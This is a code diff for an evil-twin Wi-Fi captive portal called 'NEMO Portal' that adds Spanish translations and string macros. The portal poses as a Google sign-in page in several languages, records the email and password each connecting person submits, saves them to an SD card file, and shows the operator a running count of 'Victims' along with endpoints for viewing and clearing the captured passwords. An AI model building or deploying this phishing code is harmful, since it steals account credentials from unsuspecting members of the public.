@@ -7,8 +7,8 @@
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 
-#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
-#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
+#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR) && defined(LANGUAGE_ES_ES)
+#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT, LANGUAGE_FR_FR or LANGUAGE_ES_ES"
 #endif
 
 #if defined(LANGUAGE_EN_US)
@@ -20,6 +20,16 @@
 #define LOGIN_BUTTON "Next"
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
 #define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
+#define TXT_VICTIMS "Victims"
+#define TXT_BACK_INDEX "Back to index"
+#define TXT_CLEAR_PASSWORDS "Clear passwords"
+#define TXT_SET_SSID "Set a new SSID for NEMO Portal"
+#define TXT_APPLY "Apply"
+#define TXT_SSID_CHANGED "SSID Has been changed to "
+#define TXT_PORTAL_RESTART "NEMO Portal shutting down and restarting with SSID"
+#define TXT_PLEASE_RECONNECT "Please reconnect."
+#define TXT_CREDENTIALS_RESET "The credentials list has been reset."
+#define TXT_BACK_CREDENTIALS "Back to capturedCredentialsHtml"
 #elif defined(LANGUAGE_PT_BR)
 #define LOGIN_TITLE "Fazer login"
 #define LOGIN_SUBTITLE "Use sua Conta do Google"
@@ -29,6 +39,16 @@
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
+#define TXT_VICTIMS "V&iacute;timas"
+#define TXT_BACK_INDEX "Voltar ao &iacute;ndice"
+#define TXT_CLEAR_PASSWORDS "Limpar senhas"
+#define TXT_SET_SSID "Definir um novo SSID para o Portal NEMO"
+#define TXT_APPLY "Aplicar"
+#define TXT_SSID_CHANGED "O SSID foi alterado para "
+#define TXT_PORTAL_RESTART "O Portal NEMO está sendo desligado e reiniciado com o SSID"
+#define TXT_PLEASE_RECONNECT "Por favor, reconecte-se."
+#define TXT_CREDENTIALS_RESET "A lista de credenciais foi redefinida."
+#define TXT_BACK_CREDENTIALS "Voltar para capturedCredentialsHtml"
 #elif defined(LANGUAGE_IT_IT)
 #define LOGIN_TITLE "Accedi"
 #define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
@@ -38,6 +58,16 @@
 #define LOGIN_BUTTON "Avanti"
 #define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
 #define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
+#define TXT_VICTIMS "Vittime"
+#define TXT_BACK_INDEX "Torna all'indice"
+#define TXT_CLEAR_PASSWORDS "Cancellare le password"
+#define TXT_SET_SSID "Impostare un nuovo SSID per il Portale NEMO"
+#define TXT_APPLY "Applicare"
+#define TXT_SSID_CHANGED "L'SSID &egrave; stato modificato in "
+#define TXT_PORTAL_RESTART "NEMO Portal si spegne e si riavvia con il SSID"
+#define TXT_PLEASE_RECONNECT "Si prega di riconnettersi."
+#define TXT_CREDENTIALS_RESET "L'elenco delle credenziali &egrave; stato ripristinato."
+#define TXT_BACK_CREDENTIALS "Torna a capturedCredentialsHtml"
 #elif defined(LANGUAGE_FR_FR)
 #define LOGIN_TITLE "Connexion"
 #define LOGIN_SUBTITLE "Utiliser votre compte Google"
@@ -47,6 +77,35 @@
 #define LOGIN_BUTTON "Suivant"
 #define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
 #define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
+#define TXT_VICTIMS "Victimes"
+#define TXT_BACK_INDEX "Retour &agrave; l'index"
+#define TXT_CLEAR_PASSWORDS "Effacer les mots de passe"
+#define TXT_SET_SSID "D&eacute;finir un nouveau SSID pour le portail NEMO"
+#define TXT_APPLY "Appliquer"
+#define TXT_SSID_CHANGED "SSID a &eacute;t&eacute; modifi&eacute; en "
+#define TXT_PORTAL_RESTART "NEMO Portal s'arr&ecirc;te et red&ecaute;marre avec le SSID"
+#define TXT_PLEASE_RECONNECT "Veuillez vous reconnecter."
+#define TXT_CREDENTIALS_RESET "La liste des informations d'identification a &eacute;t&eacute; r&eacute;initialis&eacute;e."
+#define TXT_BACK_CREDENTIALS "Retour &agrave; capturedCredentialsHtml"
+#elif defined(LANGUAGE_ES_ES)
+#define LOGIN_TITLE "Iniciar sesi&oacute;n"
+#define LOGIN_SUBTITLE "Iniciar sesi&oacute;n con Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Correo Electr&oacute;nico"
+#define LOGIN_PASSWORD_PLACEHOLDER "Contrase&ntilde;a"
+#define LOGIN_MESSAGE "Inicie sesi&oacute;n para navegar de forma segura."
+#define LOGIN_BUTTON "Siguiente"
+#define LOGIN_AFTER_MESSAGE "Por favor, espere unos minutos. En breve podr&aacute; acceder a Internet."
+#define TYPE_SSID_TEXT "La longitud del SSID debe estar entre 2 y 32\nInv&aacute;lido: ?,$,\",[,\\,],+\n\nTipo de SSID\nPresiona Intro para confirmar\n\n"
+#define TXT_VICTIMS "Victimas"
+#define TXT_BACK_INDEX "Volver al &iacute;ndice"
+#define TXT_CLEAR_PASSWORDS "Limpiar contrase&ntilde;as"
+#define TXT_SET_SSID "Establecer un nuevo SSID para el Portal NEMO"
+#define TXT_APPLY "Aplicar"
+#define TXT_SSID_CHANGED "SSID ha sido cambiado a "
+#define TXT_PORTAL_RESTART "NEMO Portal se apaga y se reinicia con SSID"
+#define TXT_PLEASE_RECONNECT "Por favor, reconectese."
+#define TXT_CREDENTIALS_RESET "La lista de credenciales se ha restablecido."
+#define TXT_BACK_CREDENTIALS "Volver a capturedCredentialsHtml"
 #endif
 
 int totalCapturedCredentials = 0;
@@ -172,7 +231,7 @@ void printHomeToScreen() {
   DISP.println("Paths: /creds /ssid");
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
+  DISP.printf("%s: %-4d\n", TXT_VICTIMS, totalCapturedCredentials);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
@@ -215,7 +274,10 @@ String getHtmlContents(String body) {
 }
 
 String creds_GET() {
-  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
+  String backToIndex = String(TXT_BACK_INDEX);
+  String clearPasswords = String(TXT_CLEAR_PASSWORDS);
+
+  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>" + backToIndex + "</a></p><p><a style=\"color:blue\" href=/clear>" + clearPasswords + "</a></p></center>");
 }
 
 String index_GET() {
@@ -232,7 +294,10 @@ String index_GET() {
 String index_POST() {
   String email = getInputValue("email");
   String password = getInputValue("password");
-  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
+  String labelEmail = String(LOGIN_EMAIL_PLACEHOLDER);
+  String labelPassword = String(LOGIN_PASSWORD_PLACEHOLDER);
+
+  capturedCredentialsHtml = "<li>" + labelEmail + ": <b>" + email + "</b></br>" + labelPassword + ": <b>" + password + "</b></li>" + capturedCredentialsHtml;
 
 #if defined(SDCARD)
   appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
@@ -241,23 +306,34 @@ String index_POST() {
 }
 
 String ssid_GET() {
-  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+  String setSsid = String(TXT_SET_SSID);
+  String apply = String(TXT_APPLY);
+
+  return getHtmlContents("<p>" + setSsid + ":</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>" + apply + "</button></div></form>");
 }
 
 String ssid_POST() {
   String ssid = getInputValue("ssid");
-  Serial.println("SSID Has been changed to " + ssid);
+  String ssidChanged = String(TXT_SSID_CHANGED);
+  String portalRestart = String(TXT_PORTAL_RESTART);
+  String pleaseReconnect = String(TXT_PLEASE_RECONNECT);
+
+  Serial.println(ssidChanged + ssid);
   setSSID(ssid);
   printHomeToScreen();
-  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
+  return getHtmlContents(portalRestart + " <b>" + ssid + "</b>. " + pleaseReconnect);
 }
 
 String clear_GET() {
   String email = "<p></p>";
   String password = "<p></p>";
+  String credentialsListReset = String(TXT_CREDENTIALS_RESET);
+  String backCredentials = String(TXT_BACK_CREDENTIALS);
+  String backToIndex = String(TXT_BACK_INDEX);
+
   capturedCredentialsHtml = "<p></p>";
   totalCapturedCredentials = 0;
-  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
+  return getHtmlContents("<div><p>" + credentialsListReset + "</div></p><center><a style=\"color:blue\" href=/creds>" + backCredentials + "</a></center><center><a style=\"color:blue\" href=/>" + backToIndex + "</a></center>");
 }
 
 #if defined(M5LED)
@@ -305,7 +381,7 @@ void setupWebServer() {
     blinkLed();
 #endif
   });
-  
+
   Serial.println("Registering /creds");
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "text/html", creds_GET());
